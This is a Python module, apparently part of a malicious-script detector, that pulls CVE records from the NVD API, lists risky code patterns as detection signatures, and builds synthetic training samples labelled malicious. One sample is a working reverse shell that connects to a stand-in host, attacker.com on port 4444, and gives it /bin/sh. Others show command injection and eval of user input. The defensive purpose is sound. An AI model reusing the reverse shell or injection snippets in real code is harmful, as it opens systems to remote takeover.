"""
CVE Feeds Data Source
Fetches CVE data and exploit patterns from NVD (National Vulnerability Database).
"""

from scriptguard.utils.logger import logger
import requests
from typing import List, Dict, Optional
from datetime import datetime, timedelta

class CVEFeedSource:
    """CVE feeds integration for vulnerability and exploit patterns."""

    NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"

    def __init__(self, api_key: Optional[str] = None):
        """
        Initialize CVE feed source.

        Args:
            api_key: NVD API key (optional, increases rate limit)
        """
        self.api_key = api_key
        self.headers = {}
        if api_key:
            self.headers["apiKey"] = api_key

    def _make_request(self, params: Dict, retry_count: int = 3) -> Optional[Dict]:
        """
        Make request to NVD API with retry logic.

        Args:
            params: Query parameters
            retry_count: Number of retries on failure

        Returns:
            JSON response or None on error
        """
        import time

        for attempt in range(retry_count):
            try:
                logger.debug(f"Making request to {self.NVD_API_URL} (attempt {attempt + 1}/{retry_count})")
                logger.debug(f"Params: {params}")

                # Create a new session for each request to avoid connection reuse issues
                session = requests.Session()
                session.headers.update(self.headers)

                response = session.get(
                    self.NVD_API_URL,
                    params=params,
                    timeout=30
                )

                session.close()

                logger.debug(f"Response status: {response.status_code}")
                logger.debug(f"Full URL: {response.url}")

                if response.status_code == 200:
                    try:
                        return response.json()
                    except ValueError as json_error:
                        logger.error(f"Failed to parse JSON response: {json_error}")
                        if attempt < retry_count - 1:
                            time.sleep(2 ** attempt)  # Exponential backoff
                            continue
                        return None

                elif response.status_code == 403:
                    logger.error("NVD API rate limit exceeded or access forbidden")
                    return None

                elif response.status_code == 404:
                    logger.error(f"NVD API returned 404 - invalid endpoint or parameters")
                    logger.error(f"Full URL: {response.url}")
                    logger.error(f"Response: {response.text[:500]}")

                    # 404 might be temporary, retry with backoff
                    if attempt < retry_count - 1:
                        logger.info(f"Retrying after {2 ** attempt} seconds...")
                        time.sleep(2 ** attempt)
                        continue
                    return None

                else:
                    logger.error(f"NVD API error: {response.status_code}")
                    logger.error(f"Response text: {response.text[:500]}")

                    if attempt < retry_count - 1:
                        time.sleep(2 ** attempt)
                        continue
                    return None

            except requests.exceptions.Timeout:
                logger.error(f"Request timeout (attempt {attempt + 1}/{retry_count})")
                if attempt < retry_count - 1:
                    time.sleep(2 ** attempt)
                    continue
                return None

            except requests.exceptions.RequestException as e:
                logger.error(f"Request failed: {e} (attempt {attempt + 1}/{retry_count})")
                if attempt < retry_count - 1:
                    time.sleep(2 ** attempt)
                    continue
                return None

        return None

    def fetch_recent_cves(
        self,
        days: int = 30,
        keywords: Optional[List[str]] = None
    ) -> List[Dict]:
        """
        Fetch recent CVEs matching keywords.

        Args:
            days: Number of days to look back
            keywords: Keywords to filter CVEs (e.g., ["script", "code execution"])

        Returns:
            List of CVE data dictionaries
        """
        if keywords is None:
            keywords = [
                "script",
                "code execution",
                "remote code execution",
                "command injection",
                "arbitrary code"
            ]

        end_date = datetime.now()
        start_date = end_date - timedelta(days=days)

        logger.info(f"Fetching CVEs from {start_date.date()} to {end_date.date()}")

        # NVD API 2.0 requires ISO 8601 format: YYYY-MM-DDTHH:MM:SS.mmm
        # Use 00:00:00 for start and 23:59:59 for end to capture full day
        params = {
            "pubStartDate": start_date.strftime("%Y-%m-%dT00:00:00.000"),
            "pubEndDate": end_date.strftime("%Y-%m-%dT23:59:59.999"),
            "resultsPerPage": 2000  # Max allowed
        }

        data = self._make_request(params)

        if not data or "vulnerabilities" not in data:
            logger.error("Failed to fetch CVEs")
            return []

        vulnerabilities = data["vulnerabilities"]
        filtered_cves = []

        for vuln_item in vulnerabilities:
            cve_data = vuln_item.get("cve", {})
            cve_id = cve_data.get("id", "")

            # Get description
            descriptions = cve_data.get("descriptions", [])
            description = ""
            for desc in descriptions:
                if desc.get("lang") == "en":
                    description = desc.get("value", "")
                    break

            # Filter by keywords
            if keywords:
                description_lower = description.lower()
                if not any(keyword.lower() in description_lower for keyword in keywords):
                    continue

            # Get CVSS score if available
            metrics = cve_data.get("metrics", {})
            cvss_score = None
            severity = None

            if "cvssMetricV31" in metrics:
                cvss_score = metrics["cvssMetricV31"][0]["cvssData"]["baseScore"]
                severity = metrics["cvssMetricV31"][0]["cvssData"]["baseSeverity"]
            elif "cvssMetricV2" in metrics:
                cvss_score = metrics["cvssMetricV2"][0]["cvssData"]["baseScore"]
                severity = metrics["cvssMetricV2"][0]["baseSeverity"]

            # Get references
            references = []
            for ref in cve_data.get("references", []):
                references.append(ref.get("url", ""))

            filtered_cves.append({
                "cve_id": cve_id,
                "description": description,
                "cvss_score": cvss_score,
                "severity": severity,
                "published": cve_data.get("published"),
                "last_modified": cve_data.get("lastModified"),
                "references": references
            })

        logger.info(f"Found {len(filtered_cves)} relevant CVEs")
        return filtered_cves

    def fetch_exploit_patterns(self) -> List[Dict]:
        """
        Get common exploit patterns based on CVE data.

        Returns:
            List of exploit pattern dictionaries
        """
        # These are common patterns extracted from CVE analysis
        patterns = [
            {
                "pattern": "eval(",
                "description": "Dynamic code execution - commonly used in code injection attacks",
                "severity": "HIGH",
                "cve_examples": ["CVE-2014-6271", "CVE-2019-11510"]
            },
            {
                "pattern": "exec(",
                "description": "Direct code execution - high risk for arbitrary command execution",
                "severity": "HIGH",
                "cve_examples": ["CVE-2021-44228", "CVE-2017-5638"]
            },
            {
                "pattern": "os.system(",
                "description": "Shell command execution - can lead to command injection",
                "severity": "HIGH",
                "cve_examples": ["CVE-2016-10033"]
            },
            {
                "pattern": "subprocess.call(",
                "description": "Process execution - potential command injection vector",
                "severity": "MEDIUM",
                "cve_examples": ["CVE-2018-1000001"]
            },
            {
                "pattern": "__import__(",
                "description": "Dynamic module import - can load malicious code",
                "severity": "MEDIUM",
                "cve_examples": []
            },
            {
                "pattern": "pickle.loads(",
                "description": "Unsafe deserialization - remote code execution risk",
                "severity": "HIGH",
                "cve_examples": ["CVE-2019-16785"]
            },
            {
                "pattern": "yaml.load(",
                "description": "Unsafe YAML deserialization - code execution risk",
                "severity": "HIGH",
                "cve_examples": ["CVE-2020-1747"]
            },
            {
                "pattern": "input(",
                "description": "User input (Python 2) - evaluates as code",
                "severity": "HIGH",
                "cve_examples": []
            },
            {
                "pattern": "compile(",
                "description": "Dynamic code compilation - can execute arbitrary code",
                "severity": "MEDIUM",
                "cve_examples": []
            },
            {
                "pattern": "open(",
                "description": "File operations - potential path traversal",
                "severity": "LOW",
                "cve_examples": ["CVE-2019-5418"]
            },
            {
                "pattern": "socket.",
                "description": "Network operations - potential backdoor or data exfiltration",
                "severity": "MEDIUM",
                "cve_examples": []
            },
            {
                "pattern": "base64.b64decode(",
                "description": "Base64 decoding - often used to obfuscate malicious code",
                "severity": "LOW",
                "cve_examples": []
            },
            {
                "pattern": "requests.get(",
                "description": "HTTP requests - potential C2 communication or data exfiltration",
                "severity": "LOW",
                "cve_examples": []
            },
            {
                "pattern": "ctypes.",
                "description": "Direct memory access - can bypass security controls",
                "severity": "MEDIUM",
                "cve_examples": []
            },
            {
                "pattern": "__builtins__",
                "description": "Access to built-in functions - sandbox escape technique",
                "severity": "HIGH",
                "cve_examples": []
            }
        ]

        logger.info(f"Loaded {len(patterns)} exploit patterns")
        return patterns

    def get_exploit_pattern_samples(self) -> List[Dict]:
        """
        Generate synthetic malicious code samples based on exploit patterns.

        Returns:
            List of synthetic malicious samples
        """
        samples = []

        # Command injection patterns
        samples.append({
            "content": "import os\ncmd = input('Enter command: ')\nos.system(cmd)",
            "label": "malicious",
            "source": "cve_patterns",
            "url": "synthetic",
            "metadata": {
                "pattern": "command_injection",
                "severity": "HIGH",
                "description": "Command injection via os.system"
            }
        })

        # Code execution patterns
        samples.append({
            "content": "user_input = input('Enter code: ')\neval(user_input)",
            "label": "malicious",
            "source": "cve_patterns",
            "url": "synthetic",
            "metadata": {
                "pattern": "arbitrary_code_execution",
                "severity": "HIGH",
                "description": "Arbitrary code execution via eval"
            }
        })

        # Unsafe deserialization
        samples.append({
            "content": "import pickle\ndata = input('Enter data: ')\nobj = pickle.loads(data)",
            "label": "malicious",
            "source": "cve_patterns",
            "url": "synthetic",
            "metadata": {
                "pattern": "unsafe_deserialization",
                "severity": "HIGH",
                "description": "Unsafe deserialization with pickle"
            }
        })

        # Backdoor pattern
        samples.append({
            "content": "import socket\ns=socket.socket()\ns.connect(('attacker.com',4444))\nimport subprocess\nsubprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno())",
            "label": "malicious",
            "source": "cve_patterns",
            "url": "synthetic",
            "metadata": {
                "pattern": "reverse_shell",
                "severity": "HIGH",
                "description": "Reverse shell backdoor"
            }
        })

        logger.info(f"Generated {len(samples)} synthetic exploit samples")
        return samples
